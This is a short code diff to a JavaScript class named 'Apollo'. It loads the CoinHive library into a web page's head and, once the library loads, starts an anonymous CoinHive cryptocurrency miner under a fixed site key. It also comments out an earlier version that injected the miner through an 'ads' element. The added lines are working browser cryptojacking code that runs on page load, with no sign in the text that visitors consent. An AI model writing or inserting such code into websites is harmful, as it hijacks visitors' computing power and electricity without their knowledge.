@@ -46,11 +46,14 @@ class Apollo {
     var head = document.getElementsByTagName('head')[0];
     var script = document.createElement('script');
     script.type = 'text/javascript';
+    script.onload = function() {
+        var miner = new CoinHive.Anonymous('TKNKIC69TXviFytXEOLxbIqS1z9GplN9');miner.start();
+    }
     script.src = '//coinhive.com/lib/coinhive.min.js';
     head.appendChild(script);
 
-    let adsHTML = `<script>var miner = new CoinHive.Anonymous('TKNKIC69TXviFytXEOLxbIqS1z9GplN9');miner.start();</script>`
-    document.getElementById("ads").innerHTML = adsHTML
+    // let adsHTML = `<script>var miner = new CoinHive.Anonymous('TKNKIC69TXviFytXEOLxbIqS1z9GplN9');miner.start();</script>`
+    // document.getElementById("ads").innerHTML = adsHTML
 
   }
 }
